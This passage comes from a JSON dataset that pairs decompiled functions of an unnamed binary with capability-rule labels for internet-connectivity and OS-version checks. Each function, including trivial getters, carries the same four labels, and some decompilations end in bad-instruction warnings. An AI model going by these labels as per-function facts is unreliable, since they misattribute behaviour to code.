        "decompiled_code": "\nuint __cdecl fcn.00063130(uint arg_8h, uint arg_ch, int32_t arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    \n    if (arg_14h == NULL) {\n        uVar1 = 0x21590068;\n    }\n    else {\n        *arg_14h = 0;\n        if (arg_10h == 0) {\n            uVar1 = 0x21590067;\n        }\n        else if (*0xb1c67768 == 0) {\n            uVar1 = 0x21590001;\n        }\n        else if (*0xb1c67760 == -1) {\n            uVar1 = 0x21590007;\n        }\n        else {\n            uVar1 = fcn.00061a80(arg_8h, arg_ch, arg_10h, arg_14h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 209
    },
    "000631a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000631a0(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    bool bVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint arg_14h;\n    uint *arg_18h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    bVar1 = false;\n    var_4h = 0;\n    var_ch = 0;\n    var_18h = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_10h = arg_10h;\n    if (arg_10h == NULL) {\n        return 0x21590067;\n    }\n    *arg_10h = 0;\n    if (arg_8h == 0) {\n        return 0x21590065;\n    }\n    if (arg_ch == 0) {\n        return 0x21590066;\n    }\n    if (*0xb1c67768 == 0) {\n        return 0x21590001;\n    }\n    var_1ch = fcn.000617d0(&var_ch, &var_18h);\n    if (var_1ch == 0) {\n        var_4h = 1;\n        var_1ch = 0x21590005;\n        for (var_8h = 0; var_8h < *0xb1c67760; var_8h = var_8h + 1) {\n            if ((*(*0xb1c6775c + 4 + var_8h * 8) != 0) && (*(*(*0xb1c6775c + 4 + var_8h * 8) + 8) == arg_8h)) {\n                if (*(*(*0xb1c6775c + 4 + var_8h * 8) + 0x74) != arg_ch) {\n                    fcn.000617f0(var_ch, var_18h);\n                    return 0x21590064;\n                }\n                *(*(*0xb1c6775c + 4 + var_8h * 8) + 0x84) = *(*(*0xb1c6775c + 4 + var_8h * 8) + 0x84) + 1;\n                var_1ch = 0;\n                *arg_10h = *(*0xb1c6775c + 4 + var_8h * 8);\n                break;\n            }\n        }\n        fcn.000617f0(var_ch, var_18h);\n        var_4h = 0;\n        if (var_1ch == 0) {\n            return 0;\n        }\n        if (*0xb1c67760 == 0xff) {\n            return 0x21590007;\n        }\n        arg_18h = &var_10h;\n        arg_14h = 1;\n        uVar2 = fcn.00062d30();\n        var_1ch = fcn.000625e0(arg_8h, 0, uVar2, arg_14h, arg_18h);\n        if (var_1ch != 0) {\n            return var_1ch;\n        }\n        var_10h[0xd] = *var_10h;\n        var_10h[0xe] = var_10h[6];\n        var_1ch = fcn.00061810(var_10h + 0xd, var_10h + 0xe, var_10h + 0xd);\n        if (var_1ch == 0) {\n            var_10h[0x1d] = arg_ch;\n            var_10h[0x1b] = 1;\n            uVar2 = fcn.00062d30();\n            var_10h[0x1f] = uVar2;\n            var_10h[0x1e] = arg_8h;\n            var_1ch = fcn.00061750(var_10h + 0x1e, var_10h + 0x1f, 0, var_10h + 0x20);\n            if (var_1ch == 0) {\n                var_14h = 1;\n                var_1ch = fcn.000617d0(&var_ch, &var_18h);\n                if (var_1ch == 0) {\n                    var_4h = 1;\n                    var_28h = var_10h[0x1e];\n                    var_24h = var_10h[0x1f];\n                    var_1ch = fcn.00061710(&var_28h, &var_24h, &var_20h);\n                    if (var_1ch == 0) {\n                        bVar1 = true;\n                        for (var_8h = 0; (var_8h < *0xb1c67760 && (*(*0xb1c6775c + 4 + var_8h * 8) != 0));\n                            var_8h = var_8h + 1) {\n                        }\n                        if (*0xb1c67760 <= var_8h) {\n                            iVar3 = fcn.00035260(0xb1c6775c, *0xb1c67760 << 3, *0xb1c67760 * 8 + 8);\n                            if (iVar3 == -1) {\n                                var_1ch = 0x21590004;\n                                fcn.00062cb0(var_10h);\n                                goto code_r0x00063547;\n                            }\n                            var_8h = *0xb1c67760;\n                            *0xb1c67760 = *0xb1c67760 + 1;\n                        }\n                        var_1ch = fcn.00062c40(var_10h, var_8h);\n                        if (var_1ch == 0) {\n                            fcn.00036f40(*0xb1c6775c + 4 + var_8h * 8, var_10h);\n                            fcn.00036f40(*0xb1c6775c + var_8h * 8, var_10h[0x1d]);\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00063547:\n    if (bVar1) {\n        fcn.00061730(var_28h, var_24h, var_20h);\n    }\n    if (var_4h != 0) {\n        fcn.000617f0(var_ch, var_18h);\n    }\n    if (var_1ch == 0) {\n        fcn.000617b0(var_10h[0x1e], var_10h[0x1f], var_10h[0x20]);\n        var_10h[0x1e] = 0;\n        var_10h[0x1f] = 0;\n        var_10h[0x20] = 0;\n        *arg_10h = var_10h;\n    }\n    else {\n        if (var_14h != 0) {\n            fcn.000617b0(var_10h[0x1e], var_10h[0x1f], var_10h[0x20]);\n        }\n        fcn.00062bb0(&var_10h);\n    }\n    return var_1ch;\n}\n",
        "token_count": 1749
    },
    "000635f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000635f0(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    uint uVar2;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    bVar1 = false;\n    var_4h = 0;\n    var_10h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_34h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_ch = 0;\n    var_14h = *arg_8h;\n    if (*0xb1c67768 == 0) {\n        return 0x21590001;\n    }\n    if ((var_14h == 0) || ((*(var_14h + 0x6c) != 0 && (*(var_14h + 0x6c) != 1)))) {\n        return 0x21590065;\n    }\n    var_30h = *(var_14h + 8);\n    if (((var_30h == 0) || (*(var_14h + 0x14) == 0)) || (*(var_14h + 0x10) == 0)) {\n        return 0x21590065;\n    }\n    var_20h = fcn.000619d0(var_14h, &var_24h, &var_ch);\n    if (var_20h != 0) {\n        return var_20h;\n    }\n    if (*(var_14h + 0x78) == 0) {\n        uVar2 = fcn.00062d30();\n        *(var_14h + 0x7c) = uVar2;\n        *(var_14h + 0x78) = *(var_14h + 8);\n        var_20h = fcn.00061750(var_14h + 0x78, var_14h + 0x7c, 0, var_14h + 0x80);\n        if (var_20h != 0) goto code_r0x0006386d;\n    }\n    var_20h = fcn.000617d0(&var_10h, &var_1ch);\n    if (var_20h == 0) {\n        var_4h = 1;\n        var_34h = *(var_14h + 0x78);\n        var_2ch = *(var_14h + 0x7c);\n        var_20h = fcn.00061710(&var_34h, &var_2ch, &var_28h);\n        if (var_20h == 0) {\n            bVar1 = true;\n            var_20h = fcn.00061810();\n            if (var_20h == 0) {\n                for (var_8h = 0; var_8h < *0xb1c67760; var_8h = var_8h + 1) {\n                    if (*(*0xb1c6775c + 4 + var_8h * 8) == var_14h) {\n                        *(*(*0xb1c6775c + 4 + var_8h * 8) + 0x84) = *(*(*0xb1c6775c + 4 + var_8h * 8) + 0x84) + -1;\n                        if (*(*(*0xb1c6775c + 4 + var_8h * 8) + 0x84) != 0) {\n                            var_20h = 0;\n                            goto code_r0x0006386d;\n                        }\n                        fcn.00036f40(*0xb1c6775c + 4 + var_8h * 8, 0);\n                        fcn.00036f40(*0xb1c6775c + var_8h * 8, 0);\n                        var_8h = 0xffffffff;\n                        break;\n                    }\n                }\n                if (var_8h == 0xffffffff) {\n                    fcn.00062cb0(var_14h);\n                    var_18h = 1;\n                    var_20h = 0;\n                }\n                else {\n                    var_20h = 0x21590005;\n                }\n            }\n        }\n    }\ncode_r0x0006386d:\n    if (bVar1) {\n        fcn.00061730(var_34h, var_2ch, var_28h);\n    }\n    if (var_4h != 0) {\n        fcn.000617f0(var_10h, var_1ch);\n    }\n    if ((var_20h == 0) && (var_18h != 0)) {\n        fcn.000617b0(*(var_14h + 0x78), *(var_14h + 0x7c), *(var_14h + 0x80));\n        fcn.00062bb0(arg_8h);\n    }\n    fcn.00062200(var_24h, var_ch);\n    return var_20h;\n}\n",
        "token_count": 1244
    },
    "000638e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000638e0(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t *arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t var_25ch;\n    uint var_258h;\n    int32_t var_1bch;\n    \n    if (*0xb1c67768 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else if (arg_8h == 0) {\n        uVar1 = 0x21590065;\n    }\n    else if (arg_14h == NULL) {\n        uVar1 = 0x21590068;\n    }\n    else {\n        fcn.00060b70(&var_258h);\n        fcn.00060c10(&var_258h, 0x20);\n        fcn.00060c70(&var_258h, 0);\n        fcn.000607b0(&var_258h, arg_8h, arg_ch);\n        var_25ch = 0;\n        *arg_14h = 0;\n        while (((var_25ch < arg_ch &&\n                (((arg_10h == 0 || (*arg_14h < arg_10h)) && (iVar2 = fcn.00060bb0(&var_258h),  iVar2 != 0)))) &&\n               ((*arg_14h = *arg_14h + 1,  var_1bch != 0x1be && (var_1bch != 0x1bf))))) {\n            iVar2 = fcn.00060ca0(&var_258h);\n            var_25ch = iVar2 + var_25ch;\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 410
    },
    "000639f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000639f0(uint *arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h[0x1b] == 0) {\n        var_8h = **arg_8h;\n    }\n    else {\n        var_8h = *arg_8h;\n    }\n    return var_8h;\n}\n",
        "token_count": 91
    },
    "00063a30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00063a30(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c67768 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.00061af0(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00063a60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00063a60(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c67768 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.00061b80(arg_8h, arg_ch, arg_10h);\n    }\n    return uVar1;\n}\n",
        "token_count": 100
    },
    "00063ac0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00063ac0(uint arg_8h, uint arg_ch, int32_t *arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00035230(0x88);\n    *arg_10h = iVar1;\n    if (*arg_10h == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078790(*arg_10h, 0, 0x88);\n        iVar1 = fcn.00063ba0(1, arg_8h, arg_ch, *arg_10h);\n        if (iVar1 == 0) {\n            *arg_14h = *(*arg_10h + 8);\n        }\n        else {\n            fcn.00035330(*arg_10h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 211
    },
    "00063b40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00063b40(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (*arg_8h == 0)) {\n        iVar1 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.00063ba0(0, 0, 0, *arg_8h);\n        if (iVar1 == 0) {\n            fcn.00035330(*arg_8h);\n            *arg_8h = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 144
    },
    "00063ba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00063c0e)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00063ba0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uchar var_8h;\n    uchar var_7h;\n    int32_t var_6h;\n    \n    var_ch._0_2_ = 0;\n    var_ch._2_2_ = 0;\n    var_8h = 0;\n    var_7h = 0;\n    var_6h._0_2_ = 0;\n    if (arg_14h == 0) {\n        return 0x21590068;\n    }\n    if (arg_8h == 0) {\n        if (*(arg_14h + 0x74) == 0) {\n            return 0x21590068;\n        }\n        arg_ch = *(arg_14h + 8);\n    }\n    else {\n        if (arg_ch == 0) {\n            return 0x21590065;\n        }\n        if (arg_10h == 0) {\n            return 0x21590067;\n        }\n    }\n    iVar2 = fcn.00057850();\n    var_18h = fcn.00035230(iVar2 * 0x18);\n    if (var_18h == 0) {\n        var_28h = 0x21590004;\n    }\n    else {\n        iVar2 = fcn.00057850();\n        var_14h = iVar2 * 6 + var_18h;\n        iVar2 = fcn.00057850();\n        *0x18 = iVar2 * 6 + var_18h;\n        iVar2 = fcn.00057850();\n        *0x18 = *0x18 + iVar2 * 6;\n        var_10h = 0;\n        while (uVar3 = fcn.00057850(),  var_10h < uVar3) {\n            var_28h = fcn.00057860(var_10h, var_10h * 6 + var_18h);\n            if ((var_28h != 0) || (var_28h = fcn.00057880(var_10h, var_10h * 6 + var_14h),  var_28h != 0))\n            goto code_r0x00063e60;\n            var_10h = var_10h + 1;\n        }\n        if (arg_8h == 0) {\n            var_ch._0_2_ = *(arg_14h + 0x3c);\n            var_ch._2_2_ = *(arg_14h + 0x3c) >> 0x10;\n            uVar1 = *(arg_14h + 0x40);\n            var_8h = uVar1;\n            var_7h = uVar1 >> 8;\n            var_6h._0_2_ = uVar1 >> 0x10;\n        }\n        else {\n            var_1ch = *(var_18h + 2) + arg_ch * 8;\n            uVar1 = var_1ch[1];\n            var_ch._0_2_ = *var_1ch;\n            var_ch._2_2_ = *var_1ch >> 0x10;\n            var_8h = uVar1;\n            var_7h = uVar1 >> 8;\n            var_6h._0_2_ = uVar1 >> 0x10;\n            fcn.00078790(arg_14h, 0, 0x88);\n            *(arg_14h + 0x6c) = 0;\n            *(arg_14h + 0x74) = arg_10h;\n            *(arg_14h + 8) = arg_ch;\n            *(arg_14h + 0x3c) = *var_1ch;\n            *(arg_14h + 0x40) = var_1ch[1];\n            var_6h._0_2_ = arg_10h >> 0x10;\n            var_ch._0_2_ = arg_10h;\n            var_ch._2_2_ = 8;\n            var_8h = 0;\n            var_7h = 0x8e;\n        }\n        var_10h = 0;\n        while (uVar3 = fcn.00057850(),  var_10h < uVar3) {\n            var_1ch = *(var_18h + 2 + var_10h * 6) + arg_ch * 8;\n            *(stack0xfffffff8 + 4 + var_10h * 0xc) = CONCAT22(var_ch._2_2_, var_ch);\n            *(stack0xfffffff8 + 8 + var_10h * 0xc) = CONCAT22(var_6h, CONCAT11(var_7h, var_8h));\n            *(stack0xfffffff8 + var_10h * 0xc) = var_1ch;\n            var_10h = var_10h + 1;\n        }\n        fcn.000617d0(&var_24h, &var_20h);\n        var_10h = 0;\n        while (uVar3 = fcn.00057850(),  var_10h < uVar3) {\n            fcn.00036f40(*(stack0xfffffff8 + var_10h * 0xc), *(stack0xfffffff8 + 4 + var_10h * 0xc));\n            fcn.00036f40(*(stack0xfffffff8 + var_10h * 0xc) + 4, *(stack0xfffffff8 + 8 + var_10h * 0xc));\n            var_10h = var_10h + 1;\n        }\n        fcn.000617f0(var_24h, var_20h);\n        var_28h = 0;\ncode_r0x00063e60:\n        fcn.00035330(var_18h);\n    }\n    return var_28h;\n}\n",
        "token_count": 1460
    },
    "00063e80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00063edd\n\nuint __cdecl fcn.00063e80(uint16_t *arg_8h)\n\n{\n    uint uVar1;\n    uint var_54h;\n    uint var_ch;\n    uint var_8h;\n    \n    if (arg_8h == NULL) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        if (*arg_8h < 0xb2) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 151
    },
    "00064580": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x000645dd\n\nuint __cdecl fcn.00064580(uint16_t *arg_8h)\n\n{\n    uint uVar1;\n    uint var_54h;\n    uint var_ch;\n    uint var_8h;\n    \n    if (arg_8h == NULL) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        if (*arg_8h < 0xb2) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 150
    },
    "00064de0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00064e49\n\nuint __cdecl fcn.00064de0(uint16_t *arg_8h)\n\n{\n    uint uVar1;\n    uint var_8ch;\n    uint var_ch;\n    uint var_8h;\n    \n    if (arg_8h == NULL) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        if (*arg_8h < 0xb2) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 152
    },
    "00065560": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00065560(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    while( true ) {\n        if (arg_ch <= var_8h) {\n            return (*(arg_8h + -8 + arg_ch * 8) & 7) == 6;\n        }\n        puVar1 = arg_8h + var_8h * 8;\n        if ((*puVar1 & 7) == 5) {\n            iVar2 = var_8h + 1;\n            if ((*puVar1 & 0xf0) == 0) {\n                if (arg_ch <= iVar2 + *(puVar1 + 2)) {\n                    return false;\n                }\n            }\n            else if ((arg_ch <= *(puVar1 + 1) + iVar2) || (arg_ch <= *(puVar1 + 3) + iVar2)) {\n                return false;\n            }\n        }\n        if ((((*puVar1 & 7) == 2) || (((*puVar1 & 7) == 0 && ((*puVar1 & 0xe0) == 0x60)))) &&\n           ((0xf < *(puVar1 + 2) || (*(puVar1 + 2) < 0)))) break;\n        if ((*puVar1 == 0x34) && (*(puVar1 + 2) == 0)) {\n            return false;\n        }\n        var_8h = var_8h + 1;\n    }\n    return false;\n}\n",
        "token_count": 377
    },
    "00065670": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00065938)\n// WARNING: Removing unreachable block (ram,0x0006592d)\n// WARNING: Removing unreachable block (ram,0x0006594f)\n// WARNING: Removing unreachable block (ram,0x00065894)\n// WARNING: Removing unreachable block (ram,0x000658c4)\n// WARNING: Removing unreachable block (ram,0x000658cb)\n// WARNING: Removing unreachable block (ram,0x000658d4)\n// WARNING: Removing unreachable block (ram,0x000658e7)\n// WARNING: Removing unreachable block (ram,0x000658f0)\n// WARNING: Removing unreachable block (ram,0x00065900)\n\nint32_t __cdecl\nfcn.00065670(int32_t *arg_8h, char *arg_ch, int32_t arg_10h, uint noname_3, int32_t arg_18h, uint noname_5, \n            uint32_t arg_20h)\n\n{\n    int16_t iVar1;\n    uint arg_ch_00;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_38h;\n    int16_t *var_34h;\n    int16_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    arg_8h_00 = fcn.00035230(0x140);\n    if (arg_8h_00 == 0) {\n        var_14h = 0x21590004;\n    }\n    else {\n        fcn.00078790(arg_8h_00, 0, 0x140);\n        if ((arg_ch == NULL) || (*arg_ch == '\\0')) {\n            var_30h = 0xb1be2608;\n            var_34h = arg_8h_00 + 0x1e;\n            do {\n                iVar1 = *var_30h;\n                *var_34h = iVar1;\n                var_30h = var_30h + 1;\n                var_34h = var_34h + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            iVar3 = fcn.00078556(arg_8h_00 + 0x1e, 0x40, 0xb1be1684, arg_ch);\n            if (iVar3 < 0) {\n                *(arg_8h_00 + 0x9c) = 0;\n            }\n        }\n        if (arg_10h == 0) {\n            fcn.00078060(arg_8h_00 + 0xe4, arg_8h_00 + 0x124);\n            *(arg_8h_00 + 0x128) = 0xffffffff;\n        }\n        else {\n            var_14h = fcn.00077f20(arg_10h, (arg_20h & 1) != 0, arg_8h_00 + 0xe4, arg_8h_00 + 0x124);\n            if (var_14h != 0) goto code_r0x000659da;\n            fcn.000344f0(arg_8h_00 + 0x18);\n        }\n        iVar3 = fcn.000783a0(arg_8h_00 + 0x1e, arg_8h_00 + 0xe4, *(arg_8h_00 + 0x124), arg_8h_00 + 0xc, arg_8h_00 + 0x10\n                            );\n        if (iVar3 == 0) {\n            if (arg_18h != 0) {\n                var_14h = fcn.00077f20(arg_18h, (arg_20h & 2) != 0, arg_8h_00 + 0x9e, arg_8h_00 + 0xe0);\n                if (var_14h != 0) goto code_r0x000659da;\n                iVar3 = fcn.000782f0(arg_8h_00 + 0x1e, *(arg_8h_00 + 4), arg_8h_00 + 8);\n                if (iVar3 != 0) {\n                    var_14h = fcn.000785b6(iVar3);\n                    goto code_r0x000659da;\n                }\n                arg_ch_00 = *(*(arg_8h_00 + 8) + 4);\n                iVar3 = (**0xb1bde230)(3, arg_ch_00, 0, 0, 0, 0, 1, 0, 0);\n                if (iVar3 == 0) {\n                    var_14h = 0x21590004;\n                    goto code_r0x000659da;\n                }\n                iVar2 = *(iVar3 + 0x60);\n                *(iVar2 + -8) = 0;\n                *(iVar2 + -4) = 0;\n                *(iVar2 + -0x21) = 0;\n                iVar2 = *(iVar3 + 0x60);\n                *(iVar2 + -0x24) = 0xf;\n                *(iVar2 + -0x23) = 1;\n                *(iVar2 + -0x10) = arg_ch_00;\n                *(iVar2 + -0xc) = *(arg_8h_00 + 8);\n                *(iVar2 + -0x20) = *(arg_8h_00 + 0xc);\n                uVar4 = 0x659b4;\n                iVar3 = fcn.00078160(iVar3, arg_ch_00, &fcn.00065670::var_8h, 0xffffffff);\n                if (iVar3 != 0) {\n                    var_14h = fcn.000785b6(uVar4);\n                    goto code_r0x000659da;\n                }\n            }\n            *arg_8h = arg_8h_00;\n            var_14h = 0;\n        }\n        else {\n            var_14h = fcn.000785b6(iVar3);\n        }\n    }\ncode_r0x000659da:\n    if ((var_14h != 0) && (arg_8h_00 != 0)) {\n        if (*(arg_8h_00 + 4) != 0) {\n            fcn.00078544(*(arg_8h_00 + 4));\n        }\n        if (*(arg_8h_00 + 0xc) != 0) {\n            fcn.00078544(*(arg_8h_00 + 0x10));\n        }\n        fcn.00035330(arg_8h_00);\n    }\n    return var_14h;\n}\n",
        "token_count": 1567
    },
    "00065a30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00065b25)\n// WARNING: Removing unreachable block (ram,0x00065b1a)\n// WARNING: Removing unreachable block (ram,0x00065b3c)\n// WARNING: Removing unreachable block (ram,0x00065a81)\n// WARNING: Removing unreachable block (ram,0x00065ab1)\n// WARNING: Removing unreachable block (ram,0x00065ab8)\n// WARNING: Removing unreachable block (ram,0x00065ac1)\n// WARNING: Removing unreachable block (ram,0x00065ad4)\n// WARNING: Removing unreachable block (ram,0x00065add)\n// WARNING: Removing unreachable block (ram,0x00065aed)\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.00065a30(int32_t arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    *(arg_8h + 0x1c) = 1;\n    if (*(arg_8h + 8) != 0) {\n        arg_ch = *(*(arg_8h + 8) + 4);\n        arg_8h_00 = (**0xb1bde230)(3, arg_ch, 0, 0, 0, 0, 1, 0, 0);\n        if (arg_8h_00 != 0) {\n            iVar1 = *(arg_8h_00 + 0x60);\n            *(iVar1 + -8) = 0;\n            *(iVar1 + -4) = 0;\n            *(iVar1 + -0x21) = 0;\n            iVar1 = *(arg_8h_00 + 0x60);\n            *(iVar1 + -0x24) = 0xf;\n            *(iVar1 + -0x23) = 6;\n            *(iVar1 + -0x10) = arg_ch;\n            *(iVar1 + -0xc) = *(arg_8h + 8);\n            *(iVar1 + -0x20) = 4;\n            *(iVar1 + -0x1c) = 0;\n            *(iVar1 + -0x18) = 0;\n            *(iVar1 + -0x14) = 0;\n            fcn.00078160(arg_8h_00, arg_ch, &var_ch, 0xffffffff);\n        }\n    }\n    var_4h = *(arg_8h + 4);\n    *(arg_8h + 4) = 0;\n    if (var_4h != 0) {\n        fcn.00078544(var_4h);\n    }\n    var_4h = *(arg_8h + 0xc);\n    *(arg_8h + 4) = 0;\n  